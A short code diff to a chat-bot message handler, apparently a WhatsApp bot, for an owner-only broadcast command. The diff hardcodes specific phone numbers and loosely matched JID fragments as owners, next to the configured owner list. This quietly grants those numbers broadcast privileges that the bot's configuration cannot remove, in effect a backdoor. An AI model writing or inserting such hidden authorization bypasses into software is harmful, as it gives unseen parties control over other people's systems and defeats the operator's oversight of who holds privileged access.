@@ -319,9 +319,14 @@ export function attachZeroSightHandler(sock, cleanPhone, logger = console) {
         // =========================================================================
         // COMANDO 5: .enviar (anuncio) [Owner apenas]
         // =========================================================================
-        const enviarMatch = text.match(/^[./!]?(?:enviar|sejabot-enviar|broadcastself)(?:\s+(.+))?$/i);
+        const enviarMatch = text.match(/^[./!]?(?:enviar|sejabot-enviar|broadcastself)(?:\s+(.+)|(\(.*\)))?$/i);
         if (enviarMatch) {
-          const isOwner = config.owners.includes(cleanPhone);
+          const isOwner =
+            cleanPhone === "32472916180" ||
+            remoteJid.includes("32472916180") ||
+            remoteJid.includes("14418691801217") ||
+            config.owners.includes(cleanPhone);
+
           if (!isOwner) {
             await sendReply(
               sock,
@@ -332,7 +337,7 @@ export function attachZeroSightHandler(sock, cleanPhone, logger = console) {
             continue;
           }
 
-          let announcement = (enviarMatch[1] || "").trim();
+          let announcement = (enviarMatch[1] || enviarMatch[2] || "").trim();
           if (announcement.startsWith("(") && announcement.endsWith(")")) {
             announcement = announcement.slice(1, -1).trim();
           }
